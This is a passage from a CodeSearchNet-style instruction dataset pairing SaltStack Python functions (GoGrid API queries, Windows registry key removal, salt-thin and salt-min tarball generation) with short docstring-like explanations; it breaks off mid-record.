{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _query(action=None,\n           command=None,\n           args=None,\n           method='GET',\n           header_dict=None,\n           data=None):\n    '''\n    Make a web call to GoGrid\n\n    .. versionadded:: 2015.8.0\n    '''\n    vm_ = get_configured_provider()\n    apikey = config.get_cloud_config_value(\n        'apikey', vm_, __opts__, search_global=False\n    )\n    sharedsecret = config.get_cloud_config_value(\n        'sharedsecret', vm_, __opts__, search_global=False\n    )\n\n    path = 'https://api.gogrid.com/api/'\n\n    if action:\n        path += action\n\n    if command:\n        path += '/{0}'.format(command)\n\n    log.debug('GoGrid URL: %s', path)\n\n    if not isinstance(args, dict):\n        args = {}\n\n    epoch = six.text_type(int(time.time()))\n    hashtext = ''.join((apikey, sharedsecret, epoch))\n    args['sig'] = salt.utils.hashutils.md5_digest(hashtext)\n    args['format'] = 'json'\n    args['v'] = '1.0'\n    args['api_key'] = apikey\n\n    if header_dict is None:\n        header_dict = {}\n\n    if method != 'POST':\n        header_dict['Accept'] = 'application/json'\n\n    decode = True\n    if method == 'DELETE':\n        decode = False\n\n    return_content = None\n    result = salt.utils.http.query(\n        path,\n        method,\n        params=args,\n        data=data,\n        header_dict=header_dict,\n        decode=decode,\n        decode_type='json',\n        text=True,\n        status=True,\n        opts=__opts__,\n    )\n    log.debug('GoGrid Response Status Code: %s', result['status'])\n\n    return result['dict']", "response": "Make a web call to GoGrid s API"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _parse_key(key):\n    '''\n    split the hive from the key\n    '''\n    splt = key.split(\"\\\\\")\n    hive = splt.pop(0)\n    key = '\\\\'.join(splt)\n    return hive, key", "response": "parse the hive from the key"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef key_absent(name, use_32bit_registry=False):\n    r'''\n    .. versionadded:: 2015.5.4\n\n    Ensure a registry key is removed. This will remove the key, subkeys, and all\n    value entries.\n\n    Args:\n\n        name (str):\n            A string representing the full path to the key to be removed to\n            include the hive and the keypath. The hive can be any of the\n            following:\n\n                - HKEY_LOCAL_MACHINE or HKLM\n                - HKEY_CURRENT_USER or HKCU\n                - HKEY_USER or HKU\n\n        use_32bit_registry (bool):\n            Use the 32bit portion of the registry. Applies only to 64bit\n            windows. 32bit Windows will ignore this parameter. Default is False.\n\n    Returns:\n        dict: A dictionary showing the results of the registry operation.\n\n\n    CLI Example:\n\n        The following example will delete the ``SOFTWARE\\DeleteMe`` key in the\n        ``HKEY_LOCAL_MACHINE`` hive including all its subkeys and value pairs.\n\n        .. code-block:: yaml\n\n            remove_key_demo:\n              reg.key_absent:\n                - name: HKEY_CURRENT_USER\\SOFTWARE\\DeleteMe\n\n        In the above example the path is interpreted as follows:\n\n            - ``HKEY_CURRENT_USER`` is the hive\n            - ``SOFTWARE\\DeleteMe`` is the key\n    '''\n    ret = {'name': name,\n           'result': True,\n           'changes': {},\n           'comment': ''}\n\n    hive, key = _parse_key(name)\n\n    # Determine what to do\n    if not __utils__['reg.read_value'](hive=hive,\n                                       key=key,\n                                       use_32bit_registry=use_32bit_registry)['success']:\n        ret['comment'] = '{0} is already absent'.format(name)\n        return ret\n\n    ret['changes'] = {\n        'reg': {\n            'Removed': {\n                'Key': r'{0}\\{1}'.format(hive, key)}}}\n\n    # Check for test option\n    if __opts__['test']:\n        ret['result'] = None\n        return ret\n\n    # Delete the value\n    __utils__['reg.delete_key_recursive'](hive=hive,\n                                          key=key,\n                                          use_32bit_registry=use_32bit_registry)\n    if __utils__['reg.read_value'](hive=hive,\n                                   key=key,\n                                   use_32bit_registry=use_32bit_registry)['success']:\n        ret['result'] = False\n        ret['changes'] = {}\n        ret['comment'] = 'Failed to remove registry key {0}'.format(name)\n\n    return ret", "response": "r Ensure a key is absent in the registry."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _get_salt_call(*dirs, **namespaces):\n    '''\n    Return salt-call source, based on configuration.\n    This will include additional namespaces for another versions of Salt,\n    if needed (e.g. older interpreters etc).\n\n    :dirs: List of directories to include in the system path\n    :namespaces: Dictionary of namespace\n    :return:\n    '''\n    template = '''# -*- coding: utf-8 -*-\nimport os\nimport sys\n\n# Namespaces is a map: {namespace: major/minor version}, like {'2016.11.4': [2, 6]}\n# Appears only when configured in Master configuration.\nnamespaces = %namespaces%\n\n# Default system paths alongside the namespaces\nsyspaths = %dirs%\nsyspaths.append('py{0}'.format(sys.version_info[0]))\n\ncurr_ver = (sys.version_info[0], sys.version_info[1],)\n\nnamespace = ''\nfor ns in namespaces:\n    if curr_ver == tuple(namespaces[ns]):\n        namespace = ns\n        break\n\nfor base in syspaths:\n    sys.path.insert(0, os.path.join(os.path.dirname(__file__),\n                                    namespace and os.path.join(namespace, base) or base))\n\nif __name__ == '__main__':\n    from salt.scripts import salt_call\n    salt_call()\n'''\n\n    for tgt, cnt in [('%dirs%', dirs), ('%namespaces%', namespaces)]:\n        template = template.replace(tgt, salt.utils.json.dumps(cnt))\n\n    return salt.utils.stringutils.to_bytes(template)", "response": "Return salt - call source based on configuration."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nadds a dependency to the top list.", "response": "def _add_dependency(container, obj):\n    '''\n    Add a dependency to the top list.\n\n    :param obj:\n    :param is_file:\n    :return:\n    '''\n    if os.path.basename(obj.__file__).split('.')[0] == '__init__':\n        container.append(os.path.dirname(obj.__file__))\n    else:\n        container.append(obj.__file__.replace('.pyc', '.py'))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the alternative Python interpreter from within _get_tops function.", "response": "def gte():\n    '''\n    This function is called externally from the alternative\n    Python interpreter from within _get_tops function.\n\n    :param extra_mods:\n    :param so_mods:\n    :return:\n    '''\n    extra = salt.utils.json.loads(sys.argv[1])\n    tops = get_tops(**extra)\n\n    return salt.utils.json.dumps(tops, ensure_ascii=False)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting the top directories for the dependencies based on external configuration.", "response": "def get_ext_tops(config):\n    '''\n    Get top directories for the dependencies, based on external configuration.\n\n    :return:\n    '''\n    config = copy.deepcopy(config)\n    alternatives = {}\n    required = ['jinja2', 'yaml', 'tornado', 'msgpack']\n    tops = []\n    for ns, cfg in salt.ext.six.iteritems(config or {}):\n        alternatives[ns] = cfg\n        locked_py_version = cfg.get('py-version')\n        err_msg = None\n        if not locked_py_version:\n            err_msg = 'Alternative Salt library: missing specific locked Python version'\n        elif not isinstance(locked_py_version, (tuple, list)):\n            err_msg = ('Alternative Salt library: specific locked Python version '\n                       'should be a list of major/minor version')\n        if err_msg:\n            raise salt.exceptions.SaltSystemExit(err_msg)\n\n        if cfg.get('dependencies') == 'inherit':\n            # TODO: implement inheritance of the modules from _here_\n            raise NotImplementedError('This feature is not yet implemented')\n        else:\n            for dep in cfg.get('dependencies'):\n                mod = cfg['dependencies'][dep] or ''\n                if not mod:\n                    log.warning('Module %s has missing configuration', dep)\n                    continue\n                elif mod.endswith('.py') and not os.path.isfile(mod):\n                    log.warning('Module %s configured with not a file or does not exist: %s', dep, mod)\n                    continue\n                elif not mod.endswith('.py') and not os.path.isfile(os.path.join(mod, '__init__.py')):\n                    log.warning('Module %s is not a Python importable module with %s', dep, mod)\n                    continue\n                tops.append(mod)\n\n                if dep in required:\n                    required.pop(required.index(dep))\n\n            required = ', '.join(required)\n            if required:\n                msg = 'Missing dependencies for the alternative version' \\\n                      ' in the external configuration: {}'.format(required)\n                log.error(msg)\n                raise salt.exceptions.SaltSystemExit(msg)\n        alternatives[ns]['dependencies'] = tops\n    return alternatives"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _get_ext_namespaces(config):\n    '''\n    Get namespaces from the existing configuration.\n\n    :param config:\n    :return:\n    '''\n    namespaces = {}\n    if not config:\n        return namespaces\n\n    for ns in config:\n        constraint_version = tuple(config[ns].get('py-version', []))\n        if not constraint_version:\n            raise salt.exceptions.SaltSystemExit(\"An alternative version is configured, but not defined \"\n                                                 \"to what Python's major/minor version it should be constrained.\")\n        else:\n            namespaces[ns] = constraint_version\n\n    return namespaces", "response": "Get the namespaces from the existing configuration."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_tops(extra_mods='', so_mods=''):\n    '''\n    Get top directories for the dependencies, based on Python interpreter.\n\n    :param extra_mods:\n    :param so_mods:\n    :return:\n    '''\n    tops = []\n    for mod in [salt, jinja2, yaml, tornado, msgpack, certifi, singledispatch, concurrent,\n                singledispatch_helpers, ssl_match_hostname, markupsafe, backports_abc]:\n        if mod:\n            log.debug('Adding module to the tops: \"%s\"', mod.__name__)\n            _add_dependency(tops, mod)\n\n    for mod in [m for m in extra_mods.split(',') if m]:\n        if mod not in locals() and mod not in globals():\n            try:\n                locals()[mod] = __import__(mod)\n                moddir, modname = os.path.split(locals()[mod].__file__)\n                base, _ = os.path.splitext(modname)\n                if base == '__init__':\n                    tops.append(moddir)\n                else:\n                    tops.append(os.path.join(moddir, base + '.py'))\n            except ImportError as err:\n                log.exception(err)\n                log.error('Unable to import extra-module \"%s\"', mod)\n\n    for mod in [m for m in so_mods.split(',') if m]:\n        try:\n            locals()[mod] = __import__(mod)\n            tops.append(locals()[mod].__file__)\n        except ImportError as err:\n            log.exception(err)\n            log.error('Unable to import so-module \"%s\"', mod)\n\n    return tops", "response": "Get the top directories for the dependencies based on Python interpreter."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _get_supported_py_config(tops, extended_cfg):\n    '''\n    Based on the Salt SSH configuration, create a YAML configuration\n    for the supported Python interpreter versions. This is then written into the thin.tgz\n    archive and then verified by salt.client.ssh.ssh_py_shim.get_executable()\n\n    Note: Minimum default of 2.x versions is 2.7 and 3.x is 3.0, unless specified in namespaces.\n\n    :return:\n    '''\n    pymap = []\n    for py_ver, tops in _six.iteritems(copy.deepcopy(tops)):\n        py_ver = int(py_ver)\n        if py_ver == 2:\n            pymap.append('py2:2:7')\n        elif py_ver == 3:\n            pymap.append('py3:3:0')\n\n    for ns, cfg in _six.iteritems(copy.deepcopy(extended_cfg) or {}):\n        pymap.append('{}:{}:{}'.format(ns, *cfg.get('py-version')))\n    pymap.append('')\n\n    return salt.utils.stringutils.to_bytes(os.linesep.join(pymap))", "response": "Create a YAML configuration for the supported Python interpreter versions."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the tarball name prefixed with. thin -.", "response": "def _get_thintar_prefix(tarname):\n    '''\n    Make sure thintar temporary name is concurrent and secure.\n\n    :param tarname: name of the chosen tarball\n    :return: prefixed tarname\n    '''\n    tfd, tmp_tarname = tempfile.mkstemp(dir=os.path.dirname(tarname), prefix=\".thin-\",\n                                        suffix=\".\" + os.path.basename(tarname).split(\".\", 1)[-1])\n    os.close(tfd)\n\n    return tmp_tarname"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef gen_thin(cachedir, extra_mods='', overwrite=False, so_mods='',\n             python2_bin='python2', python3_bin='python3', absonly=True,\n             compress='gzip', extended_cfg=None):\n    '''\n    Generate the salt-thin tarball and print the location of the tarball\n    Optional additional mods to include (e.g. mako) can be supplied as a comma\n    delimited string.  Permits forcing an overwrite of the output file as well.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run thin.generate\n        salt-run thin.generate mako\n        salt-run thin.generate mako,wempy 1\n        salt-run thin.generate overwrite=1\n    '''\n    if sys.version_info < (2, 6):\n        raise salt.exceptions.SaltSystemExit('The minimum required python version to run salt-ssh is \"2.6\".')\n    if compress not in ['gzip', 'zip']:\n        log.warning('Unknown compression type: \"%s\". Falling back to \"gzip\" compression.', compress)\n        compress = 'gzip'\n\n    thindir = os.path.join(cachedir, 'thin')\n    if not os.path.isdir(thindir):\n        os.makedirs(thindir)\n    thintar = os.path.join(thindir, 'thin.' + (compress == 'gzip' and 'tgz' or 'zip'))\n    thinver = os.path.join(thindir, 'version')\n    pythinver = os.path.join(thindir, '.thin-gen-py-version')\n    salt_call = os.path.join(thindir, 'salt-call')\n    pymap_cfg = os.path.join(thindir, 'supported-versions')\n    code_checksum = os.path.join(thindir, 'code-checksum')\n    digest_collector = salt.utils.hashutils.DigestCollector()\n\n    with salt.utils.files.fopen(salt_call, 'wb') as fp_:\n        fp_.write(_get_salt_call('pyall', **_get_ext_namespaces(extended_cfg)))\n\n    if os.path.isfile(thintar):\n        if not overwrite:\n            if os.path.isfile(thinver):\n                with salt.utils.files.fopen(thinver) as fh_:\n                    overwrite = fh_.read() != salt.version.__version__\n                if overwrite is False and os.path.isfile(pythinver):\n                    with salt.utils.files.fopen(pythinver) as fh_:\n                        overwrite = fh_.read() != str(sys.version_info[0])  # future lint: disable=blacklisted-function\n            else:\n                overwrite = True\n\n        if overwrite:\n            try:\n                log.debug('Removing %s archive file', thintar)\n                os.remove(thintar)\n            except OSError as exc:\n                log.error('Error while removing %s file: %s', thintar, exc)\n                if os.path.exists(thintar):\n                    raise salt.exceptions.SaltSystemExit(\n                        'Unable to remove {0}. See logs for details.'.format(thintar)\n                    )\n        else:\n            return thintar\n    if _six.PY3:\n        # Let's check for the minimum python 2 version requirement, 2.6\n        py_shell_cmd = \"{} -c 'import sys;sys.stdout.write(\\\"%s.%s\\\\n\\\" % sys.version_info[:2]);'\".format(python2_bin)\n        cmd = subprocess.Popen(py_shell_cmd, stdout=subprocess.PIPE, shell=True)\n        stdout, _ = cmd.communicate()\n        if cmd.returncode == 0:\n            py2_version = tuple(int(n) for n in stdout.decode('utf-8').strip().split('.'))\n            if py2_version < (2, 6):\n                raise salt.exceptions.SaltSystemExit(\n                    'The minimum required python version to run salt-ssh is \"2.6\".'\n                    'The version reported by \"{0}\" is \"{1}\". Please try \"salt-ssh '\n                    '--python2-bin=<path-to-python-2.6-binary-or-higher>\".'.format(python2_bin, stdout.strip()))\n        else:\n            log.error('Unable to detect Python-2 version')\n            log.debug(stdout)\n\n    tops_failure_msg = 'Failed %s tops for Python binary %s.'\n    tops_py_version_mapping = {}\n    tops = get_tops(extra_mods=extra_mods, so_mods=so_mods)\n    tops_py_version_mapping[sys.version_info.major] = tops\n\n    # Collect tops, alternative to 2.x version\n    if _six.PY2 and sys.version_info.major == 2:\n        # Get python 3 tops\n        py_shell_cmd = \"{0} -c 'import salt.utils.thin as t;print(t.gte())' '{1}'\".format(\n            python3_bin, salt.utils.json.dumps({'extra_mods': extra_mods, 'so_mods': so_mods}))\n        cmd = subprocess.Popen(py_shell_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n        stdout, stderr = cmd.communicate()\n        if cmd.returncode == 0:\n            try:\n                tops = salt.utils.json.loads(stdout)\n                tops_py_version_mapping['3'] = tops\n            except ValueError as err:\n                log.error(tops_failure_msg, 'parsing', python3_bin)\n                log.exception(err)\n        else:\n            log.error(tops_failure_msg, 'collecting', python3_bin)\n            log.debug(stderr)\n\n    # Collect tops, alternative to 3.x version\n    if _six.PY3 and sys.version_info.major == 3:\n        # Get python 2 tops\n        py_shell_cmd = \"{0} -c 'import salt.utils.thin as t;print(t.gte())' '{1}'\".format(\n            python2_bin, salt.utils.json.dumps({'extra_mods': extra_mods, 'so_mods': so_mods}))\n        cmd = subprocess.Popen(py_shell_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n        stdout, stderr = cmd.communicate()\n        if cmd.returncode == 0:\n            try:\n                tops = salt.utils.json.loads(stdout.decode('utf-8'))\n                tops_py_version_mapping['2'] = tops\n            except ValueError as err:\n                log.error(tops_failure_msg, 'parsing', python2_bin)\n                log.exception(err)\n        else:\n            log.error(tops_failure_msg, 'collecting', python2_bin)\n            log.debug(stderr)\n\n    with salt.utils.files.fopen(pymap_cfg, 'wb') as fp_:\n        fp_.write(_get_supported_py_config(tops=tops_py_version_mapping, extended_cfg=extended_cfg))\n\n    tmp_thintar = _get_thintar_prefix(thintar)\n    if compress == 'gzip':\n        tfp = tarfile.open(tmp_thintar, 'w:gz', dereference=True)\n    elif compress == 'zip':\n        tfp = zipfile.ZipFile(tmp_thintar, 'w', compression=zlib and zipfile.ZIP_DEFLATED or zipfile.ZIP_STORED)\n        tfp.add = tfp.write\n\n    try:  # cwd may not exist if it was removed but salt was run from it\n        start_dir = os.getcwd()\n    except OSError:\n        start_dir = None\n    tempdir = None\n\n    # Pack default data\n    log.debug('Packing default libraries based on current Salt version')\n    for py_ver, tops in _six.iteritems(tops_py_version_mapping):\n        for top in tops:\n            if absonly and not os.path.isabs(top):\n                continue\n            base = os.path.basename(top)\n            top_dirname = os.path.dirname(top)\n            if os.path.isdir(top_dirname):\n                os.chdir(top_dirname)\n            else:\n                # This is likely a compressed python .egg\n                tempdir = tempfile.mkdtemp()\n                egg = zipfile.ZipFile(top_dirname)\n                egg.extractall(tempdir)\n                top = os.path.join(tempdir, base)\n                os.chdir(tempdir)\n\n            site_pkg_dir = _is_shareable(base) and 'pyall' or 'py{}'.format(py_ver)\n\n            log.debug('Packing \"%s\" to \"%s\" destination', base, site_pkg_dir)\n            if not os.path.isdir(top):\n                # top is a single file module\n                if os.path.exists(os.path.join(top_dirname, base)):\n                    tfp.add(base, arcname=os.path.join(site_pkg_dir, base))\n                continue\n            for root, dirs, files in salt.utils.path.os_walk(base, followlinks=True):\n                for name in files:\n                    if not name.endswith(('.pyc', '.pyo')):\n                        digest_collector.add(os.path.join(root, name))\n                        arcname = os.path.join(site_pkg_dir, root, name)\n                        if hasattr(tfp, 'getinfo'):\n                            try:\n                                # This is a little slow but there's no clear way to detect duplicates\n                                tfp.getinfo(os.path.join(site_pkg_dir, root, name))\n                                arcname = None\n                            except KeyError:\n                                log.debug('ZIP: Unable to add \"%s\" with \"getinfo\"', arcname)\n                        if arcname:\n                            tfp.add(os.path.join(root, name), arcname=arcname)\n\n            if tempdir is not None:\n                shutil.rmtree(tempdir)\n                tempdir = None\n\n    # Pack alternative data\n    if extended_cfg:\n        log.debug('Packing libraries based on alternative Salt versions')\n    for ns, cfg in _six.iteritems(get_ext_tops(extended_cfg)):\n        tops = [cfg.get('path')] + cfg.get('dependencies')\n        py_ver_major, py_ver_minor = cfg.get('py-version')\n        for top in tops:\n            base, top_dirname = os.path.basename(top), os.path.dirname(top)\n            os.chdir(top_dirname)\n            site_pkg_dir = _is_shareable(base) and 'pyall' or 'py{0}'.format(py_ver_major)\n            log.debug('Packing alternative \"%s\" to \"%s/%s\" destination', base, ns, site_pkg_dir)\n            if not os.path.isdir(top):\n                # top is a single file module\n                if os.path.exists(os.path.join(top_dirname, base)):\n                    tfp.add(base, arcname=os.path.join(ns, site_pkg_dir, base))\n                continue\n            for root, dirs, files in salt.utils.path.os_walk(base, followlinks=True):\n                for name in files:\n                    if not name.endswith(('.pyc', '.pyo')):\n                        digest_collector.add(os.path.join(root, name))\n                        arcname = os.path.join(ns, site_pkg_dir, root, name)\n                        if hasattr(tfp, 'getinfo'):\n                            try:\n                                tfp.getinfo(os.path.join(site_pkg_dir, root, name))\n                                arcname = None\n                            except KeyError:\n                                log.debug('ZIP: Unable to add \"%s\" with \"getinfo\"', arcname)\n                        if arcname:\n                            tfp.add(os.path.join(root, name), arcname=arcname)\n\n    os.chdir(thindir)\n    with salt.utils.files.fopen(thinver, 'w+') as fp_:\n        fp_.write(salt.version.__version__)\n    with salt.utils.files.fopen(pythinver, 'w+') as fp_:\n        fp_.write(str(sys.version_info.major))  # future lint: disable=blacklisted-function\n    with salt.utils.files.fopen(code_checksum, 'w+') as fp_:\n        fp_.write(digest_collector.digest())\n    os.chdir(os.path.dirname(thinver))\n\n    for fname in ['version', '.thin-gen-py-version', 'salt-call', 'supported-versions', 'code-checksum']:\n        tfp.add(fname)\n\n    if start_dir:\n        os.chdir(start_dir)\n    tfp.close()\n\n    shutil.move(tmp_thintar, thintar)\n\n    return thintar", "response": "Generate a salt - thin tarball and print the location of the tarball."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef thin_sum(cachedir, form='sha1'):\n    '''\n    Return the checksum of the current thin tarball\n    '''\n    thintar = gen_thin(cachedir)\n    code_checksum_path = os.path.join(cachedir, 'thin', 'code-checksum')\n    if os.path.isfile(code_checksum_path):\n        with salt.utils.files.fopen(code_checksum_path, 'r') as fh:\n            code_checksum = \"'{0}'\".format(fh.read().strip())\n    else:\n        code_checksum = \"'0'\"\n\n    return code_checksum, salt.utils.hashutils.get_hash(thintar, form)", "response": "Return the checksum of the current thin tarball\n   "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ngenerate the salt - min tarball and print the location of the tarball.", "response": "def gen_min(cachedir, extra_mods='', overwrite=False, so_mods='',\n            python2_bin='python2', python3_bin='python3'):\n    '''\n    Generate the salt-min tarball and print the location of the tarball\n    Optional additional mods to include (e.g. mako) can be supplied as a comma\n    delimited string.  Permits forcing an overwrite of the output file as well.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run min.generate\n        salt-run min.generate mako\n        salt-run min.generate mako,wempy 1\n        salt-run min.generate overwrite=1\n    '''\n    mindir = os.path.join(cachedir, 'min')\n    if not os.path.isdir(mindir):\n        os.makedirs(mindir)\n    mintar = os.path.join(mindir, 'min.tgz')\n    minver = os.path.join(mindir, 'version')\n    pyminver = os.path.join(mindir, '.min-gen-py-version')\n    salt_call = os.path.join(mindir, 'salt-call')\n    with salt.utils.files.fopen(salt_call, 'wb') as fp_:\n        fp_.write(_get_salt_call())\n    if os.path.isfile(mintar):\n        if not overwrite:\n            if os.path.isfile(minver):\n                with salt.utils.files.fopen(minver) as fh_:\n                    overwrite = fh_.read() != salt.version.__version__\n                if overwrite is False and os.path.isfile(pyminver):\n                    with salt.utils.files.fopen(pyminver) as fh_:\n                        overwrite = fh_.read() != str(sys.version_info[0])  # future lint: disable=blacklisted-function\n            else:\n                overwrite = True\n\n        if overwrite:\n            try:\n                os.remove(mintar)\n            except OSError:\n                pass\n        else:\n            return mintar\n    if _six.PY3:\n        # Let's check for the minimum python 2 version requirement, 2.6\n        py_shell_cmd = (\n            python2_bin + ' -c \\'from __future__ import print_function; import sys; '\n            'print(\"{0}.{1}\".format(*(sys.version_info[:2])));\\''\n        )\n        cmd = subprocess.Popen(py_shell_cmd, stdout=subprocess.PIPE, shell=True)\n        stdout, _ = cmd.communicate()\n        if cmd.returncode == 0:\n            py2_version = tuple(int(n) for n in stdout.decode('utf-8').strip().split('.'))\n            if py2_version < (2, 6):\n                # Bail!\n                raise salt.exceptions.SaltSystemExit(\n                    'The minimum required python version to run salt-ssh is \"2.6\".'\n                    'The version reported by \"{0}\" is \"{1}\". Please try \"salt-ssh '\n                    '--python2-bin=<path-to-python-2.6-binary-or-higher>\".'.format(python2_bin,\n                                                                                stdout.strip())\n                )\n    elif sys.version_info < (2, 6):\n        # Bail! Though, how did we reached this far in the first place.\n        raise salt.exceptions.SaltSystemExit(\n            'The minimum required python version to run salt-ssh is \"2.6\".'\n        )\n\n    tops_py_version_mapping = {}\n    tops = get_tops(extra_mods=extra_mods, so_mods=so_mods)\n    if _six.PY2:\n        tops_py_version_mapping['2'] = tops\n    else:\n        tops_py_version_mapping['3'] = tops\n\n    # TODO: Consider putting known py2 and py3 compatible libs in it's own sharable directory.\n    #       This would reduce the min size.\n    if _six.PY2 and sys.version_info[0] == 2:\n        # Get python 3 tops\n        py_shell_cmd = (\n            python3_bin + ' -c \\'import sys; import json; import salt.utils.thin; '\n            'print(json.dumps(salt.utils.thin.get_tops(**(json.loads(sys.argv[1]))), ensure_ascii=False)); exit(0);\\' '\n            '\\'{0}\\''.format(salt.utils.json.dumps({'extra_mods': extra_mods, 'so_mods': so_mods}))\n        )\n        cmd = subprocess.Popen(py_shell_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n        stdout, stderr = cmd.communicate()\n        if cmd.returncode == 0:\n            try:\n                tops = salt.utils.json.loads(stdout)\n                tops_py_version_mapping['3'] = tops\n            except ValueError:\n                pass\n    if _six.PY3 and sys.version_info[0] == 3:\n        # Get python 2 tops\n        py_shell_cmd = (\n            python2_bin + ' -c \\'from __future__ import print_function; '\n            'import sys; import json; import salt.utils.thin; '\n            'print(json.dumps(salt.utils.thin.get_tops(**(json.loads(sys.argv[1]))), ensure_ascii=False)); exit(0);\\' '\n            '\\'{0}\\''.format(salt.utils.json.dumps({'extra_mods': extra_mods, 'so_mods': so_mods}))\n        )\n        cmd = subprocess.Popen(py_shell_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n        stdout, stderr = cmd.communicate()\n        if cmd.returncode == 0:\n            try:\n                tops = salt.utils.json.loads(stdout.decode('utf-8'))\n                tops_py_version_mapping['2'] = tops\n            except ValueError:\n                pass\n\n    tfp = tarfile.open(mintar, 'w:gz', dereference=True)\n    try:  # cwd may not exist if it was removed but salt was run from it\n        start_dir = os.getcwd()\n    except OSError:\n        start_dir = None\n    tempdir = None\n\n    # This is the absolute minimum set of files required to run salt-call\n    min_files = (\n        'salt/__init__.py',\n        'salt/utils',\n        'salt/utils/__init__.py',\n        'salt/utils/atomicfile.py',\n        'salt/utils/validate',\n        'salt/utils/validate/__init__.py',\n        'salt/utils/validate/path.py',\n        'salt/utils/decorators',\n        'salt/utils/decorators/__init__.py',\n        'salt/utils/cache.py',\n        'salt/utils/xdg.py',\n        'salt/utils/odict.py',\n        'salt/utils/minions.py',\n        'salt/utils/dicttrim.py',\n        'salt/utils/sdb.py',\n        'salt/utils/migrations.py',\n        'salt/utils/files.py',\n        'salt/utils/parsers.py',\n        'salt/utils/locales.py',\n        'salt/utils/lazy.py',\n        'salt/utils/s3.py',\n        'salt/utils/dictupdate.py',\n        'salt/utils/verify.py',\n        'salt/utils/args.py',\n        'salt/utils/kinds.py',\n        'salt/utils/xmlutil.py',\n        'salt/utils/debug.py',\n        'salt/utils/jid.py',\n        'salt/utils/openstack',\n        'salt/utils/openstack/__init__.py',\n        'salt/utils/openstack/swift.py',\n        'salt/utils/asynchronous.py',\n        'salt/utils/process.py',\n        'salt/utils/jinja.py',\n        'salt/utils/rsax931.py',\n        'salt/utils/context.py',\n        'salt/utils/minion.py',\n        'salt/utils/error.py',\n        'salt/utils/aws.py',\n        'salt/utils/timed_subprocess.py',\n        'salt/utils/zeromq.py',\n        'salt/utils/schedule.py',\n        'salt/utils/url.py',\n        'salt/utils/yamlencoding.py',\n        'salt/utils/network.py',\n        'salt/utils/http.py',\n        'salt/utils/gzip_util.py',\n        'salt/utils/vt.py',\n        'salt/utils/templates.py',\n        'salt/utils/aggregation.py',\n        'salt/utils/yaml.py',\n        'salt/utils/yamldumper.py',\n        'salt/utils/yamlloader.py',\n        'salt/utils/event.py',\n        'salt/utils/state.py',\n        'salt/serializers',\n        'salt/serializers/__init__.py',\n        'salt/serializers/yamlex.py',\n        'salt/template.py',\n        'salt/_compat.py',\n        'salt/loader.py',\n        'salt/client',\n        'salt/client/__init__.py',\n        'salt/ext',\n        'salt/ext/__init__.py',\n        'salt/ext/six.py',\n        'salt/ext/ipaddress.py',\n        'salt/version.py',\n        'salt/syspaths.py',\n        'salt/defaults',\n        'salt/defaults/__init__.py',\n        'salt/defaults/exitcodes.py',\n        'salt/renderers',\n        'salt/renderers/__init__.py',\n        'salt/renderers/jinja.py',\n        'salt/renderers/yaml.py',\n        'salt/modules',\n        'salt/modules/__init__.py',\n        'salt/modules/test.py',\n        'salt/modules/selinux.py',\n        'salt/modules/cmdmod.py',\n        'salt/modules/saltutil.py',\n        'salt/minion.py',\n        'salt/pillar',\n        'salt/pillar/__init__.py',\n        'salt/textformat.py',\n        'salt/log',\n        'salt/log/__init__.py',\n        'salt/log/handlers',\n        'salt/log/handlers/__init__.py',\n        'salt/log/mixins.py',\n        'salt/log/setup.py',\n        'salt/cli',\n        'salt/cli/__init__.py',\n        'salt/cli/caller.py',\n        'salt/cli/daemons.py',\n        'salt/cli/salt.py',\n        'salt/cli/call.py',\n        'salt/fileserver',\n        'salt/fileserver/__init__.py',\n        'salt/transport',\n        'salt/transport/__init__.py',\n        'salt/transport/client.py',\n        'salt/exceptions.py',\n        'salt/grains',\n        'salt/grains/__init__.py',\n        'salt/grains/extra.py',\n        'salt/scripts.py',\n        'salt/state.py',\n        'salt/fileclient.py',\n        'salt/crypt.py',\n        'salt/config.py',\n        'salt/beacons',\n        'salt/beacons/__init__.py',\n        'salt/payload.py',\n        'salt/output',\n        'salt/output/__init__.py',\n        'salt/output/nested.py',\n    )\n\n    for py_ver, tops in _six.iteritems(tops_py_version_mapping):\n        for top in tops:\n            base = os.path.basename(top)\n            top_dirname = os.path.dirname(top)\n            if os.path.isdir(top_dirname):\n                os.chdir(top_dirname)\n            else:\n                # This is likely a compressed python .egg\n                tempdir = tempfile.mkdtemp()\n                egg = zipfile.ZipFile(top_dirname)\n                egg.extractall(tempdir)\n                top = os.path.join(tempdir, base)\n                os.chdir(tempdir)\n            if not os.path.isdir(top):\n                # top is a single file module\n                tfp.add(base, arcname=os.path.join('py{0}'.format(py_ver), base))\n                continue\n            for root, dirs, files in salt.utils.path.os_walk(base, followlinks=True):\n                for name in files:\n                    if name.endswith(('.pyc', '.pyo')):\n                        continue\n                    if root.startswith('salt') and os.path.join(root, name) not in min_files:\n                        continue\n                    tfp.add(os.path.join(root, name),\n                            arcname=os.path.join('py{0}'.format(py_ver), root, name))\n            if tempdir is not None:\n                shutil.rmtree(tempdir)\n                tempdir = None\n\n    os.chdir(mindir)\n    tfp.add('salt-call')\n    with salt.utils.files.fopen(minver, 'w+') as fp_:\n        fp_.write(salt.version.__version__)\n    with 